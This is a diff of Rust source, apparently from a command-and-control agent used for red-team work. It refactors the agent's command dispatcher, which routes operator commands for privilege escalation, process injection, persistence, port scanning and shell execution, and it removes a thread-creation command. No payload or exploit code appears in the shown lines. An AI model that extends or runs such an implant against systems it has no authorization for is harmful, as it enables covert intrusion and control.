@@ -33,7 +33,6 @@ pub enum CommandType {
     Elevate,
     Getprivs,
     Inject,
-    CreateThread,
     Portscan,
     Persist,
     Ps,
@@ -100,6 +99,17 @@ impl CommandArgs {
 
         CommandArgs { items: items, count: 0 }
     }
+
+    /// Converts the args into a space-separated string.
+    /// 
+    /// Real handy for shell commands.
+    pub fn to_string(&self) -> String {
+        self.items
+            .as_slice()
+            .join(" ")
+            .trim()
+            .to_string()
+    }
 }
 
 impl Iterator for CommandArgs {
@@ -109,7 +119,7 @@ impl Iterator for CommandArgs {
 
         if self.items.len() > self.count {
             self.count += 1;
-            Some(self.items[self.count - 1])
+            Some(self.items[self.count - 1].to_string())
         } else {
             None
         }
@@ -137,7 +147,6 @@ impl NotionCommand {
 
             let command_type: CommandType = match t {
                 "cd"       => CommandType::Cd,
-                "createthread" => CommandType::CreateThread,
                 "download" => CommandType::Download,
                 "elevate"  => CommandType::Elevate,
                 "getprivs" => CommandType::Getprivs,
@@ -161,25 +170,24 @@ impl NotionCommand {
         }
     }
     /// Executes the appropriate function for the `command_type`. 
-    pub async fn handle(&self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
+    pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
-            CommandType::Cd       => cd::handle(self.args),
-            CommandType::Download => download::handle(self.args, logger).await,
-            CommandType::Elevate  => elevate::handle(self.args, config_options).await,
+            CommandType::Cd       => cd::handle(&mut self.args),
+            CommandType::Download => download::handle( &mut self.args, logger).await,
+            CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
-            CommandType::Inject   => inject::handle(self.args, logger).await,
-            CommandType::Persist  => persist::handle(self.args, config_options, logger).await,
-            CommandType::Portscan => portscan::handle(self.args, logger).await,
+            CommandType::Inject   => inject::handle(&self.args, logger).await,
+            CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
+            CommandType::Portscan => portscan::handle(&mut self.args, logger).await,
             CommandType::Ps          => ps::handle().await,
             CommandType::Pwd         => pwd::handle().await,
-            CommandType::Runas    => runas::handle(self.args).await,
-            CommandType::Save     => save::handle(self.args, config_options).await,
-            CommandType::Shell    => shell::handle(self.args).await,
+            CommandType::Runas    => runas::handle(&self.args).await,
+            CommandType::Save     => save::handle(&mut self.args, config_options).await,
+            CommandType::Shell    => shell::handle(&mut self.args).await,
             CommandType::Shutdown    => shutdown::handle().await,
-            CommandType::Sleep    => sleep::handle(self.args, config_options).await,
+            CommandType::Sleep    => sleep::handle(&mut self.args, config_options).await,
             CommandType::Whoami      => whoami::handle().await,
             CommandType::Unknown  => unknown::handle().await,
-            CommandType::CreateThread => createthread::handle(self.args, logger).await 
         }
     }
 }
